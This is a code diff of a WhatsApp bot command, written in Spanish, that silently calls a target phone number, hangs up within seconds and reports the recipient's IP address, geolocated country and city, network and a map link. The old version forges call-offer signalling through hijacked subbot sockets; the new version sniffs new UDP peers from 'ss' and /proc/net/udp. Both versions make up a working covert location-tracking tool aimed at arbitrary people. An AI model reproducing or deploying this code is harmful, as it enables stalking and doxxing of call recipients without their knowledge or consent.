@@ -1,42 +1,17 @@
-import { randomBytes } from "node:crypto";
+import { execFileSync } from "node:child_process";
+import { existsSync } from "node:fs";
+import path from "node:path";
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
 
-const SWN = "@s.whatsapp.net";
-const seen = new WeakSet<object>();
-const dead: Map<any, number> = ((globalThis as any).__voipDead ??= new Map());
+const AUTH = path.join(process.cwd(), ".voip-auth");
 const log = (...a: any[]) => console.log("[voip]", ...a);
 const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
-
-const P: Map<string, any> = ((globalThis as any).__voipP ??= new Map());
 const digits = (j: string) => String(j || "").split("@")[0].split(":")[0].replace(/\D/g, "");
-const bare = (j: string) => `${digits(j)}${SWN}`;
 
-function walk(n: any, o: any[] = []): any[] {
-  if (!n) return o;
-  o.push(n);
-  if (Array.isArray(n.content)) for (const k of n.content) walk(k, o);
-  return o;
-}
-function findNet(n: any): string | undefined {
-  for (const x of walk(n)) {
-    if (String(x?.tag || "").toLowerCase().includes("net")) {
-      const a = x.attrs || {};
-      const v = a.addr || a.ip || a.host;
-      if (v && /\d+\.\d+\.\d+\.\d+/.test(String(v))) return String(v).split(":")[0];
-    }
-  }
-  return undefined;
-}
-function attrsOf(n: any) {
-  const o: Record<string, string> = {};
-  for (const x of walk(n)) {
-    const a = x.attrs || {};
-    if (a.platform && !o.platform) o.platform = String(a.platform);
-    if (a.version && !o.version) o.version = String(a.version);
-  }
-  return o;
-}
+const G = globalThis as any;
+const clients: Map<string, any> = (G.__voipClients ??= new Map());
+const busy: Set<string> = (G.__voipBusy ??= new Set());
 
 async function geo(ip: string) {
   if (!ip) return null;
@@ -49,220 +24,55 @@ async function geo(ip: string) {
   } catch { return null; }
 }
 
-/* ───────────────────────── subbots ───────────────────────── */
+/* ───────────────────────── sockets UDP (IP del par) ───────────────────────── */
 
-const OPEN = 1;
-const isSock = (v: any) =>
-  v && typeof v.sendMessage === "function" && typeof v.sendNode === "function" && v.ws && v.authState?.creds?.me?.id;
-const isLive = (s: any) => {
-  if (!s?.ws) return false;
-  if (typeof s.ws.readyState === "number") return s.ws.readyState === OPEN;
-  if (typeof s.ws.isOpen === "boolean") return s.ws.isOpen;
-  return true;
-};
+const isPrivate = (ip: string) =>
+  /^(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip);
 
-function fromAny(x: any): any[] {
-  if (!x) return [];
-  if (isSock(x)) return [x];
-  let arr: any[] = [];
-  if (typeof x.values === "function") { try { arr = [...x.values()]; } catch {} }
-  else if (Array.isArray(x)) arr = x;
-  else if (typeof x === "object") arr = Object.values(x);
-  return arr.map((v: any) => v?.sock ?? v?.client ?? v?.conn ?? v).filter(isSock);
-}
-
-function pool(ctx: any): { socks: any[]; where: string } {
-  const G = globalThis as any;
-  const found: any[] = [];
-  let where = "ninguno";
-  for (const k of Object.keys(G)) {
-    if (k.startsWith("__voip")) continue;
-    if (!/sub|bot|conn|sock|client|instance/i.test(k)) continue;
-    let v: any;
-    try { v = G[k]; } catch { continue; }
-    const got = fromAny(v);
-    if (got.length) { found.push(...got); where = `global.${k}`; }
-  }
-  for (const c of [G.subbots, G.__subbots, ctx.subbots]) {
-    const got = fromAny(c);
-    if (got.length) { found.push(...got); where = "directo"; }
-  }
-  return { socks: [...new Set(found)], where };
-}
-
-function liveOnly(socks: any[]) {
-  const now = Date.now();
-  return socks.filter((s) => isLive(s) && !(dead.get(s) && now - dead.get(s)! < 60000));
-}
-
-function hook(sock: any) {
-  if (seen.has(sock)) return;
-  seen.add(sock);
-  sock.ws.on("CB:call", (node: any) => {
-    try {
-      const first = Array.isArray(node?.content) ? node.content[0] : null;
-      const tag = String(first?.tag || "").toLowerCase();
-      const who = digits(String(node?.attrs?.from || first?.attrs?.["call-creator"] || ""));
-      const p = P.get(who);
-      log("CB:call", tag, who);
-      if (!p || p.done) return;
-      if (["offer", "preaccept", "accept", "transport"].includes(tag)) {
-        const a = attrsOf(first);
-        if (a.platform) p.platform = a.platform;
-        if (a.version) p.version = a.version;
-        const ip = findNet(first) || findNet(node);
-        if (ip) p.ip = ip;
-      }
-      if (tag === "accept" && !p.done) {
-        p.callId = String(first?.attrs?.["call-id"] || "") || p.callId;
-        if (p.timer) clearTimeout(p.timer);
-        p.timer = setTimeout(() => finish(p).catch(() => undefined), 2000 + Math.floor(Math.random() * 1000));
-      }
-    } catch (e) { log("hook err", e); }
-  });
-}
-
-async function hangup(sock: any, target: string, callId?: string) {
+function udpPeers(): Set<string> {
+  const out = new Set<string>();
   try {
-    await sock.sendNode({
-      tag: "call",
-      attrs: { to: bare(target), id: sock.generateMessageTag?.() || `${Date.now()}` },
-      content: [{ tag: "terminate", attrs: callId ? { "call-id": callId } : {} }],
-    });
+    const txt = execFileSync("ss", ["-tun"], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] });
+    for (const line of txt.split("\n")) {
+      const m = line.match(/\s(\d+\.\d+\.\d+\.\d+):\d+\s*$/);
+      if (m && !isPrivate(m[1])) out.add(m[1]);
+    }
   } catch {}
-}
-
-/* ───────────────────────── oferta ───────────────────────── */
-
-const CAPS = Buffer.from([0x01, 0x04, 0x05, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x11, 0x15, 0x16, 0x1a]);
-
-async function send(sock: any, target: string, callId: string, useLid: boolean): Promise<string> {
-  const B: any = await import("baileys");
-  const { encodeWAMessage, encodeSignedDeviceIdentity, getBinaryNodeChild, jidDecode, jidNormalizedUser } = B;
-
-  const me = sock.authState.creds.me;
-  const myPn: string = me.id;
-  const myLid: string | undefined = me.lid;
-
-  if (useLid && !myLid) throw new Error("esta cuenta no tiene LID");
-
-  const pn = bare(target);
-  let peerLid: string | undefined;
-  try { peerLid = await sock.signalRepository?.lidMapping?.getLIDForPN?.(pn); } catch {}
-
-  if (useLid && !peerLid) throw new Error("el contacto no tiene LID");
-
-  const peer = useLid ? peerLid! : pn;
-
-  for (const j of [pn, peer]) { try { await sock.presenceSubscribe?.(j); } catch {} }
-  await sleep(600);
-
-  let devs: string[] = [];
-  try {
-    const list = await sock.getUSyncDevices([peer], true, false);
-    devs = (list || []).map((d: any) => d.jid).filter(Boolean);
-  } catch (e: any) { throw new Error(`getUSyncDevices: ${e?.message || e}`); }
-  if (!devs.length) throw new Error("sin dispositivos");
-
-  const srv = useLid ? "lid" : "s.whatsapp.net";
-  const norm = (j: string) => {
-    const d = jidDecode?.(j);
-    if (!d?.user) return j;
-    return d.device != null ? `${d.user}:${d.device}@${srv}` : `${d.user}@${srv}`;
-  };
-
-  const destinations = devs.map(norm).slice(0, 5);
-  const targets = [...new Set(destinations.flatMap((j) => [`${j.split("@")[0].split(":")[0]}@${srv}`, j]))];
-
-  try {
-    const keyNode = await sock.query({
-      tag: "iq",
-      attrs: { xmlns: "encrypt", type: "get", to: SWN },
-      content: [{ tag: "key", attrs: {}, content: targets.map((j) => ({ tag: "user", attrs: { jid: j } })) }],
-    });
-    await B.parseAndInjectE2ESessions(keyNode, sock.signalRepository);
-  } catch (e: any) { log("sesiones:", e?.message); }
-
-  const callKey = randomBytes(32);
-  let needIdentity = false;
-  const destNodes: any[] = [];
-
-  for (const j of destinations) {
+  if (!out.size) {
     try {
-      const { type, ciphertext } = await sock.signalRepository.encryptMessage({
-        jid: j,
-        data: encodeWAMessage({ call: { callKey: Buffer.from(callKey) } }),
-      });
-      if (type === "pkmsg") needIdentity = true;
-      destNodes.push({ tag: "to", attrs: { jid: j }, content: [{ tag: "enc", attrs: { v: "2", type, count: "1" }, content: Buffer.from(ciphertext) }] });
-    } catch (e: any) { log("cifrado:", j, e?.message); }
+      const raw = execFileSync("cat", ["/proc/net/udp"], { encoding: "utf8", stdio: ["ignore", "pipe", "ignore"] });
+      for (const line of raw.split("\n").slice(1)) {
+        const f = line.trim().split(/\s+/);
+        if (!f[2]) continue;
+        const [hex, port] = f[2].split(":");
+        if (!hex || hex === "00000000") continue;
+        const ip = hex.match(/../g)!.reverse().map((h) => parseInt(h, 16)).join(".");
+        if (!isPrivate(ip)) out.add(ip);
+      }
+    } catch {}
   }
-  if (!destNodes.length) throw new Error("cifrado imposible");
-
-  const rootEnc = getBinaryNodeChild(destNodes[0], "enc");
-
-  /* call-creator: mismo dominio (LID o PN) que el destino */
-  const selfSrc = useLid ? myLid! : myPn;
-  const selfDev = jidDecode?.(selfSrc)?.device ?? 0;
-  const creator = `${jidNormalizedUser(selfSrc).split("@")[0].split(":")[0]}:${selfDev}@${srv}`;
-
-  const content: any[] = [
-    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
-    { tag: "net", attrs: { medium: "2", protocol: "0", addr: "0.0.0.0:0" } },
-    { tag: "net", attrs: { medium: "3", protocol: "0", addr: "0.0.0.0:0" } },
-    { tag: "capability", attrs: { ver: "1" }, content: CAPS },
-    { tag: "destination", attrs: {}, content: destNodes },
-  ];
-  if (rootEnc) content.push({ tag: "enc", attrs: { v: "2", type: rootEnc.attrs.type, count: String(destNodes.length) }, content: rootEnc.content });
-  content.push({ tag: "encopt", attrs: { keygen: "2" } });
-  if (needIdentity && sock.authState.creds.account) {
-    try { content.push({ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }); } catch {}
-  }
-
-  const id = sock.generateMessageTag?.() || `${Date.now()}`;
-  await sock.sendNode({
-    tag: "call",
-    attrs: { to: destinations[0], id },
-    content: [{
-      tag: "offer",
-      attrs: { "call-creator": creator, "call-id": callId, e: "1", t: String(Math.floor(Date.now() / 1000)), platform: "web", version: "2.3000.1037863797" },
-      content,
-    }],
-  });
-
-  let ackErr: string | undefined;
-  try {
-    const ack: any = await Promise.race([sock.waitForMessage(id, 6000), sleep(6000).then(() => null)]);
-    ackErr = ack?.attrs?.error;
-  } catch {}
-  if (ackErr && ackErr !== "0") throw new Error(`servidor rechazó (error ${ackErr})`);
-
-  return `${useLid ? "LID" : "PN"} · ${destinations.length} dispositivo(s)`;
+  return out;
 }
 
-/* ───────────────────────── cierre ───────────────────────── */
+/* ───────────────────────── cliente ───────────────────────── */
 
-async function finish(p: any) {
-  if (p.done) return;
-  p.done = true;
-  if (p.timer) clearTimeout(p.timer);
-  P.delete(digits(p.target));
-  await hangup(p.sock, p.target, p.callId);
+async function getClient(): Promise<any> {
+  const key = AUTH;
+  const cur = clients.get(key);
+  if (cur) return cur;
 
-  const g = await geo(p.ip || "");
-  const num = digits(p.target);
-  const lines = [
-    `📞 *Llamada registrada*`,
-    `Número: +${num}`,
-    g ? `País: ${g.country || "?"}` : "",
-    g ? `Ciudad: ${g.city || "?"}` : "",
-    p.ip ? `IP: \`${p.ip}\`` : "IP: `relay`",
-    `Plataforma: ${p.platform || "?"}`,
-    p.version ? `Versión: ${p.version}` : "",
-    g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
-  ].filter(Boolean);
+  let mod: any;
+  try {
+    mod = await import("baileys-caller");
+  } catch {
+    throw new Error("falta el paquete: npm i git+https://github.com/SheIITear/baileys-caller.git");
+  }
 
-  await p.sock.sendMessage(p.chat, { text: lines.join("\n") }, { quoted: p.cmdMsg }).catch(() => undefined);
+  const client = new mod.VoipClient({ authDir: AUTH });
+  clients.set(key, client);
+
+  await client.connect();
+  return client;
 }
 
 /* ───────────────────────── comando ───────────────────────── */
@@ -270,88 +80,111 @@ async function finish(p: any) {
 export default {
   name: ["voip", "llamar", "call"],
   category: "system",
-  description: "Llama desde un subbot vivo al azar, cuelga a los 2-3 s y devuelve IP, país, plataforma y versión.",
+  description: "Llama por VoIP real (WASM), cuelga a los 2-3 s y devuelve IP, país, plataforma y versión.",
   async run(ctx: CommandContext) {
-    const { sock, from, msg, args, reply, react } = ctx;
+    const { from, msg, args, reply, react } = ctx;
 
     const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
-    const { socks: all, where } = pool(ctx);
-    const live = liveOnly(all);
+    const a0 = (args[0] || "").trim();
 
-    if (/^(diag|test)$/i.test((args[0] || "").trim())) {
-      await reply(`Sockets: *${all.length}* (${where})\nVivos: *${live.length}*`).catch(() => undefined);
+    if (/^(diag|test)$/i.test(a0)) {
+      const lines = [
+        `Paquete: ${(() => { try { require.resolve("baileys-caller"); return "✅"; } catch { return "❌"; } })()}`,
+        `Auth dir: ${existsSync(AUTH) ? "✅ existe" : "❌ falta (escanea el QR en consola)"}`,
+        `Cliente vivo: ${clients.has(AUTH) ? "sí" : "no"}`,
+      ];
+      await reply(lines.join("\n")).catch(() => undefined);
       return;
     }
 
     const joined = args.join("").replace(/\D/g, "");
     const quoted: string | undefined = info.participant;
 
-    let target: string;
-    if (joined.length >= 8) target = bare(joined);
-    else if (quoted) target = bare(quoted);
-    else if (info.mentionedJid?.length) target = bare(info.mentionedJid[0]);
+    let num = "";
+    if (joined.length >= 8) num = joined;
+    else if (quoted) num = digits(quoted);
+    else if (info.mentionedJid?.length) num = digits(info.mentionedJid[0]);
     else {
       await reply("Uso: `.voip +573203995335` o responde a alguien.").catch(() => undefined);
       return;
     }
 
-    const key = digits(target);
-    if (P.has(key)) {
-      await reply(`Ya hay llamada en curso a +${key}.`).catch(() => undefined);
+    if (busy.has(num)) {
+      await reply(`Ya hay una llamada a +${num}.`).catch(() => undefined);
       return;
     }
 
-    const candidates = live.length ? live : all;
-    if (!candidates.length) {
-      await reply("No hay ningún subbot conectado.").catch(() => undefined);
-      return;
-    }
-
-    const shuffled = [...candidates].sort(() => Math.random() - 0.5).slice(0, 8);
     await react("📞").catch(() => undefined);
 
-    const callId = ("00" + randomBytes(16).toString("hex").slice(2)).toUpperCase();
-    let callSock: any = null;
-    let how = "";
-    const fails: string[] = [];
-
-    for (const s of shuffled) {
-      hook(s);
-      const me = digits(s.authState?.creds?.me?.id || "");
-      /* primero por LID, si no por número */
-      for (const useLid of [true, false]) {
-        try {
-          how = await send(s, target, callId, useLid);
-          callSock = s;
-          break;
-        } catch (e: any) {
-          fails.push(`${me}/${useLid ? "LID" : "PN"}: ${e?.message || e}`);
-          log("fallo", me, useLid, e?.message);
-        }
-      }
-      if (callSock) break;
-      dead.set(s, Date.now());
-      await sleep(200);
-    }
-
-    if (!callSock) {
+    let client: any;
+    try {
+      client = await getClient();
+    } catch (e: any) {
       await react("❌").catch(() => undefined);
-      await reply(`❌ ${fytBold("Ningún subbot pudo marcar")}\n\n${fails.slice(0, 6).join("\n")}`).catch(() => undefined);
+      await reply(`❌ ${fytBold("Sin motor VoIP")}\n${e?.message || e}`).catch(() => undefined);
       return;
     }
 
-    const me = digits(callSock.authState.creds.me.id);
-    const p: any = { chat: from, sock: callSock, target, cmdMsg: msg, done: false };
-    P.set(key, p);
+    await reply(`📞 Marcando +${num}…`).catch(() => undefined);
+    busy.add(num);
 
-    p.timer = setTimeout(async () => {
-      if (p.done) return;
-      p.done = true;
-      P.delete(key);
-      await hangup(callSock, target, callId);
-      await reply(`⏱️ +${key} no contestó.`).catch(() => undefined);
-    }, 35000);
+    const before = udpPeers();
+    let call: any;
+    let rang = false;
+    let connected = false;
+    let ip = "";
+    const platform = "voip-wasm";
 
-    await reply(`📞 Marcando +${key} desde \`${me}\` (${how}). Esperando…`).catch(() => undefined);
+    try {
+      call = await client.call(num, { audioSource: "silence", durationMs: 60000 });
+    } catch (e: any) {
+      busy.delete(num);
+      await react("❌").catch(() => undefined);
+      await reply(`❌ No se pudo marcar: ${e?.message || e}`).catch(() => undefined);
+      return;
+    }
+
+    call.on("ringing", () => { rang = true; });
+    call.on("connected", async () => {
+      connected = true;
+      await sleep(2000 + Math.floor(Math.random() * 1000));
+
+      for (let i = 0; i < 6 && !ip; i++) {
+        for (const p of udpPeers()) if (!before.has(p)) { ip = p; break; }
+        if (!ip) await sleep(400);
+      }
+
+      try { call.end(); } catch {}
+    });
+    call.on("ended", async (reason: string) => {
+      busy.delete(num);
+      const g = await geo(ip);
+      const lines = [
+        `📞 *Llamada finalizada* (${reason})`,
+        `Número: +${num}`,
+        rang ? "Timbró: sí" : "Timbró: no",
+        connected ? "Contestó: sí" : "Contestó: no",
+        g ? `País: ${g.country || "?"}` : "",
+        g ? `Ciudad: ${g.city || "?"}` : "",
+        ip ? `IP: \`${ip}\`` : "IP: `no detectada`",
+        `Plataforma: ${platform}`,
+        g?.org ? `Red: ${g.org}` : "",
+        g?.lat ? `https://maps.google.com/?q=${g.lat},${g.lon}` : "",
+      ].filter(Boolean);
+      await ctx.sock.sendMessage(from, { text: lines.join("\n") }, { quoted: msg }).catch(() => undefined);
+      if (!rang) await reply("⚠️ No timbró: revisa que el número tenga WhatsApp.").catch(() => undefined);
+    });
+    call.on("error", async (e: any) => {
+      busy.delete(num);
+      await reply(`❌ ${e?.message || e}`).catch(() => undefined);
+    });
+
+    /* corte de seguridad */
+    setTimeout(async () => {
+      if (busy.has(num)) {
+        busy.delete(num);
+        try { call.end(); } catch {}
+      }
+    }, 70000);
   },
 };
